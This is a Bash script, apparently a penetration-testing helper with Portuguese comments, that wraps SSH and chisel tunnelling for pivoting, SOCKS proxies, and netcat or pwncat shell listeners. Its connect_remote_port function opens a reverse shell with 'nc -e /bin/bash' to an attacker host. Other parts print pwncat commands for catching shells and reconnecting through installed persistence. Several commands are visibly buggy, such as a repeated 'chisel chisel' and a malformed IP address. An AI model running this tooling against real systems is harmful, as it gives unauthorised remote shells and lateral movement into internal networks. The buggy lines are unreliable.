#!/bin/bash
########## HELP
# Usage
##### HELP
########## TODO
# -b, bind
# -r, reverse
# -s, staged
# -t, tipo, msvenon, bashsocket
##### TODO
########## Import Libs

# bind
# reverse
# stage
# stageless

# escutar porta
# conectar numa porta
# envia bash para outro local
    # socket
    # nc
# shell melhorado
    # pawncat
    # rlwrap
    # python, mostra na tela

########## FUNCTIONS
# Functions
# if not set, ask for it and set it
var_check() {
	local count=1
	for i in "$@"; do
		var_name=$i
		var_value=${!var_name}
		if [ -z "$var_value" ]; then
			read -p "$count. Type the $var_name: " var_value
			eval "$var_name=$var_value"
			((count++))
		fi
	done
}

set_colors(){
	cred="\e[31m"
	cgreen="\e[32m"
	cyellow="\e[33m"
	cblue="\e[34m"
	cpurp="\e[35m"
	cwhite="\e[36m"
	creset="\e[0m"
}
set_colors

centerPrint (){
	local color1=${3:-cblue}
	local color2=${4:-cwhite}
	local text=${1:-"STEP"}
	local char=${2:-"."}
	width=$(tput cols)
	width_sides=$(( ( $width - ${#text} )/2 - 1))
	printf -v side "%*s" "$(( $width_sides/${#char} ))" ""; side=${side// /"$char"};
	printf "%b %b %b\n" "${!color1}$side$def" "${!color2}${text}${creset}" "${!color1}$side$creset"
}

print_status(){
	if [ "$1" -eq 0 ]; then
		echo -e "${cgreen}[  OK  ]${creset} $2"
	else
		echo -e "${cred}[ FAIL ]${creset} $2"
	fi
}

local_forwarding () {
	centerPrint "$FUNCNAME" "#"
	# handle_cli_options "$@"
	echo -e "
	$cred| ${cpurp}att${cred}| ---> | piv| ---> | tar|$creset
	              ${cblue}srv${creset}
	   Nesse caso a conxão é feita do atacante para o pivo agora é o servidor ssh, no reverse ele é cliente.
	1) username@host, O pivo é o servidor ssh que tem acesso a maquina alvo
	2) socket_de_entrad:porta, é por onde quem quiser acessar o recurso tem q entrar, normalmente o kali e uma porta nao utiliada 
	3) socket_de_saida:porta, é o alvo e sua porta.
	Resumindo, ssh usuario@servidor (-L se srv no pivo ) iniciotunel:fimtunel
	"

	# var_check application 
	case ${application:="ssh"} in
		chiselsrv)
			echo "Rodar isso no pivô"
			var_check pivot_port 
			set -x
			chisel server -p $pivot_port
			set +x
			ss -lntp | grep -Eq "LISTEN*:$attacker_port"; print_status $?
		;;
		chiselc)
			echo "Rodar isso no atacante"
			var_check pivot_host pivot_port attacker_host attacker_port target_host target_port
			set -x
			chisel chisel client $pivot_host:$pivot_port $attacker_host:$attacker_port:$target_host:$target_port
			set +x
		;;
		plink)
			echo "Rodar isso no windows"
			set -x
			echo "plink.exe -l kali -pw password -C -R 8000:127.0..0.1:80 192.168.201.222"
			set +x
		;;
		*)
			var_check username pivot_host attacker_host attacker_port target_host target_port
			set -x
			ssh -p ${sshport:=22} $username@$pivot_host -N -g -L $attacker_host:$attacker_port:$target_host:$target_port
			set +x
			ss -lntp | grep -Eq "LISTEN*:$attacker_port"; print_status $?
		;;
	esac
}

reverse_local_forwarding () {
	centerPrint "$FUNCNAME" "#"

	# handle_cli_options "$@"
	echo -e "
	$cred| att| <--- | piv| ---> | tar|$creset
	  ${cblue}srv${creset}
	   Nesse caso a conexão é feita do piv para o atacante, redirecionando a porta do alvo para o atacante.
	1) username@host, O pivo é o cliente ssh que tem acesso a maquina alvo
	2) socket_de_entrad:porta, é por onde quem quiser acessar o recurso tem q entrar,  nesse caso é o computador do atacante
	3) socket_de_saida:porta, é o alvo e sua porta.
	Resumindo, ssh usuario@servidor (-R se srv no atacante ) iniciotunel:fimtunel
	"

	case ${application:="ssh"} in
		chiselsrv)
			echo "Rodar isso no pivô"
			var_check pivot_port 
			set -x
			chisel server -p $pivot_port --reverse
			set +x
			ss -lntp | grep -Eq "LISTEN*:$attacker_port"; print_status $?
		;;
		chiselc)
			echo "Rodar isso no atacante"
			var_check pivot_host pivot_port attacker_host attacker_port target_host target_port
			set -x
			chisel chisel client $pivot_host:$pivot_port R:$attacker_host:$attacker_port:$target_host:$target_port
			set +x
		;;
		plink)
		echo "não implementado"
		# echo "Y" | comando
		;;
		*)
			var_check username attacker_host pivot_port target_host target_port

			set -x	
			ssh -p ${sshport:=22} $username@$attacker_host -N -R $pivot_port:$target_host:$target_port
			set +x
			ss -lntp | grep -Eq "LISTEN*:$attacker_port"; print_status $?
		;;
	esac

}

dynamic_port_forwarding(){
	centerPrint "$FUNCNAME" "#"
	echo -e "
	$cred| ${cpurp}att${cred}| ---> | piv| ---> | tar|$creset
	              ${cblue}srv${creset}
	   Nesse caso a conxão é feita do atacante para o pivo agora é o servidor ssh, no reverse ele é cliente. Mas ao invés de redirecionar uma porta pra o alvo ele usa o pivo como um proxy socks5 e assim tem acesso a todas as maquinas que o pivo tem.
	1) username@host, O pivo é o servidor ssh que tem acesso a maquina alvo
	2) socket_de_entrad:porta, é por onde quem quiser acessar o recurso tem q entrar, normalmente o kali e uma porta nao utiliada
	3) Configurar o proxychains no atacante
	Resumindo, ssh usuario@servidor (-D ) iniciotunel
	"

	case ${application:="ssh"} in
		chiselsrv)
			echo "Rodar isso no pivô"
			var_check pivot_port 
			set -x
			chisel server -p $pivot_port --socks5
			set +x
			ss -lntp | grep -Eq "LISTEN*:$attacker_port"; print_status $?
		;;
		chiselc)
			echo "Rodar isso no atacante"
			var_check pivot_host pivot_port attacker_port
			set -x
			chisel chisel client $pivot_host:$pivot_port $attacker_port:socks
			set +x
		;;
		*)
			var_check username pivot_host attacker_host attacker_port
			set -x	
			ssh -p ${sshport:=22} $username@$pivot_host -N -g -D $attacker_host:${attacker_port:=9050}
			set +x
			ss -lntp | grep -Eq "LISTEN*:$attacker_port"; print_status $?
		;;
	esac

}

reverse_dynamic_port_forwarding(){
	centerPrint "$FUNCNAME" "#"

	# handle_cli_options "$@"
	echo -e "
	$cred| att| <--- | piv| ---> | tar|$creset
	  ${cblue}srv${creset}
	   Nesse caso a conexão é feita do piv para o atacante, redirecionando a porta do alvo para o atacante.
	1) username@host, O pivo é o cliente ssh que tem acesso a maquina alvo
	2) porta, é por onde quem quiser acessar o recurso tem q entrar,  nesse caso é a porta do computador do atacante
	4) Configurar o proxy chains no atacante
	Resumindo, ssh usuario@servidor (-N -D ) fimtunel
	"
	case ${application:="ssh"} in
		chiselsrv)
			echo "Rodar isso no pivô"
			var_check pivot_port 
			set -x
			chisel server -p $pivot_port --socks5 --reverse
			set +x
			ss -lntp | grep -Eq "LISTEN*:$attacker_port"; print_status $?
		;;
		chiselc)
			echo "Rodar isso no atacante"
			var_check pivot_host pivot_port attacker_port
			set -x
			chisel chisel client $pivot_host:$pivot_port R:$attacker_port:socks
			set +x
		;;
		*)
			var_check username attacker_host attacker_port

			set -x	
			ssh -p ${sshport:=22} $username@$attacker_host -N -R $pivot_port
			set +x
			ss -lntp | grep -Eq "LISTEN*:$attacker_port"; print_status $?
		;;
	esac
}

improve_shell () {
	centerPrint "$FUNCNAME" "#"

	echo -e "rlwrap command\n\n"
	echo -e "pwncat
	pwncat-cs connect://10.10.10.10:4444
	pwncat-cs 10.10.10.10:4444
	pwncat-cs 10.10.10.10 4444

	Listen for reverse shell
	pwncat-cs bind://0.0.0.0:4444
	pwncat-cs 0.0.0.0:4444
	pwncat-cs :4444
	pwncat-cs -lp 4444
	 ------------------------------> BIZURADO
	Connect via ssh
	pwncat-cs ssh://user:password@10.10.10.10
	pwncat-cs user@10.10.10.10
	pwncat-cs user:password@10.10.10.10
	pwncat-cs -i id_rsa user@10.10.10.10
	SSH w/ non-standard port
	pwncat-cs -p 2222 user@10.10.10.10
	pwncat-cs user@10.10.10.10:2222
	Reconnect utilizing installed persistence
	
	If reconnection fails and no protocol is specified,
	
	SSH is used as a fallback.
	pwncat-cs reconnect://user@10.10.10.10
	pwncat-cs reconnect://user@c228fc49e515628a0c13bdc4759a12bf
	pwncat-cs user@10.10.10.10
	pwncat-cs c228fc49e515628a0c13bdc4759a12bf
	pwncat-cs 10.10.10.10
	
	SE ALVO FOR WINDOWS
	pwncat-cs -m windows 10.10.10.10 4444
	pwncat-cs -m windows -lp 4444"

	echo -e "\n\npython -c 'import pty; pty.spawn(\"/bin/bash\")'; export SHELL=bash; export TERM=xterm-256color"

	# # Connect to a bind shell
	arguments="$@"
	primary_command="pwncat-cs"
	fallback_command="rlwrap"
}

listen_port (){
	centerPrint "$FUNCNAME" "#"

	var_check target_port
	
	echo -e "${cblue} Select an option:$creset"
	options=( rlwrap pwncat-cs pwncat )
    select application in "${options[@]}"; do echo $application; break; done

	case ${application:="pwncat-cs"} in
		pwncat-cs)
			set -x
			pwncat-cs -lp ${target_port:=4444}
			set +x
		;;
		pwncat)
			set -x
			pwncat -l ${target_port:=4444}
			set +x
		;;
		rlwrap)
			set -x
			rlwrap -cAr nc -lnvp ${target_port:=4444}
			set +x
		;;
		*)
			set -x
			nc -lnvp ${target_port:=4444}
			set +x
		;;
	esac
}

connect_remote_port () {
	centerPrint "$FUNCNAME" "#"

	echo -e "O servidor deve estar já em modo de escuta do outro lado!"
	var_check attacker_host attacker_port
	set -x
	nc -e /bin/bash -vn $attacker_host ${attacker_port:=4444}
	set +x
}


print_header(){
	help_version="0.2"
	help_dependencies="ssh"
	colors=( 45 34 94 97 44 ) # azul
	# colors=( 43 31 91 94 42 ) # vermelho
	# colors=( 44 32 92 95 43 ) # verde
	# colors=( 45 33 93 96 44 ) # laranja
	# colors=( 46 35 95 98 45 ) # roxo
	# colors=( 48 36 96 99 46 ) # verde oliva

	echo "
  [1;33m\\\\\\[0;0m ┌─────────────────────┐   [0;${colors[4]}m KK [0;0m[0;${colors[0]}m $(basename $0 .sh | sed "s/^kk//") [0;0m
   (o>│[0;1;${colors[1]};${colors[2]}m╻┏[0m [0;1;${colors[1]};${colors[2]}m╻┏[0m [0;1;${colors[1]};${colors[2]}m╺┳╸┏━┓┏━┓╻[0m  [0;${colors[1]}m┏━┓[0m│   [1;${colors[3]}m Author:  Otávio Augusto[0;0m
  _//)│[0;1;${colors[1]};${colors[2]}m┣┻┓┣┻┓[0m [0;1;${colors[1]};${colors[2]}m┃[0m [0;${colors[1]}m┃[0m [0;${colors[1]}m┃┃[0m [0;${colors[1]}m┃┃[0m  [0;${colors[1]}m┗━┓[0m│   [1;${colors[3]}m Contact: contact@oaugusto.pro[0;0m
 ///_)│[0;${colors[1]}m╹[0m [0;${colors[1]}m╹╹[0m [0;${colors[1]}m╹[0m [0;${colors[1]}m╹[0m [0;${colors[1]}m┗━┛┗━┛┗[0;37m━╸┗━┛[0m│   [1;${colors[3]}m Website: http://oaugusto.pro[0;0m
//_|_ └─────────────────────┘   [1;${colors[3]}m Social:  @oaugustopro[0;0m

	[0;100m ☕version [0;42m $help_version [0;0m [0;100m ✌license [0;42m MIT [0;0m 
	=================[0;0m [1;${colors[3]}m$(basename $0) execution[0;0m =================[0;0m
	Abre e informa sobre diversos tipos de shell

	Depends on ${help_dependencies}."  | sed -e "s/\t//g"

	echo -e "OPTIONS:" 
	# Show cli options
	cat "$0" | grep -Eo "[A-Za-z]) #.*" | sed "s/\#//g;s/)/,/g;s/^/-/g" | tr '\n' ';'
	echo -e "\nFUNCTIONS:"
	cat "$0" | sed -n '/#STARTOPTIONS1/,/#ENDOPTIONS1/p' | grep -Eo ".*[[:alnum:]]+)$" | tr -d ')\t' | tr -s ' ' | sort -u | cut -d '|' -f 2 | tr '\n' ';'
    echo -e "\n"
}

handle_cli_options (){
	while getopts "u:h:p:H:P:G:g:s:t:a:f:F:" option; do
		case $option in
			u) # username of the server
			username="$OPTARG"
			;;
			s) # target port
			sshport="$OPTARG"
			;;
			h) # attacker host
			attacker_host="$OPTARG"
			;;
			p) # attacker port
			attacker_port="$OPTARG"
			;;
			H) # pivot host
			pivot_host="$OPTARG"
			;;
			P) # pivot port
			pivot_port="$OPTARG"
			;;
			G) # target host
			target_host="$OPTARG"
			;;
			g) # target port
			target_port="$OPTARG"
			;;
			F) # functions, below
			function="$OPTARG"
			;;
			f) # filename
			filename="$OPTARG"
			;;
			o) # output filename
			output="$OPTARG"
			;;
			a) # application [ssh, nc, pwncat, chiselsrv chiselc, rlwrap, plink]
			application="$OPTARG"
			;;
			*)
				echo "Opção Inválida"
			;;
		esac
	done
}
# Function to handle selection or input
handle_input() {
	#STARTOPTIONS
    case "$1" in
		*"Local forwarding"|local)
			local_forwarding #-h $attacker_host -g $target_port -H $pivot_host -P $pivot_port -G $target_host  -u $username 
		;;
		*"Reverse local forwarding"|rev)
			reverse_local_forwarding #-h $attacker_host -g $target_port -H $pivot_host -P $pivot_port -G $target_host  -u $username 
		;;
		*"Dynamic port forwarding"|dyn)
			dynamic_port_forwarding #-h $attacker_host -g $target_port -H $pivot_host -P $pivot_port -G $target_host  -u $username 
		;;
		*"Dynamic reverse port forwarding"|revdyn)
			reverse_dynamic_port_forwarding #-h $attacker_host -g $target_port -H $pivot_host -P $pivot_port -G $target_host  -u $username 
		;;
		*"Listen port"|listen)
			listen_port
		;;
		*"Connect remote port"|connect)
			connect_remote_port
		;;
		*"Improve Shell"|improve_shell)
			connect_remote_port
		;;
		"Sair")
			exit 0
		;;
		*)
			echo "Invalid option $1"
		;;
	esac
	#ENDOPTIONS
}
##### END FUNCTIONS
########## MAIN
# Main script
print_header
handle_cli_options "$@"
# Check if input is provided
if [ -n "$function" ]; then
    handle_input "$function"
else
    old_IFS=$IFS; IFS=$'\n'; options=( $(cat "$0" | sed -n '/#STARTOPTIONS1/,/#ENDOPTIONS1/p' | grep -Eo ".*[[:alnum:]]+)$" | tr -d '*)\t' | tr -s ' ' | tr -d \" | cut -d '|' -f1) ); IFS=$old_IFS
    echo -e "${cblue} Select an option:$creset"
    select opt in "${options[@]}" "Sair"; do
        handle_input "$opt"
    done
fi
##### END MAIN
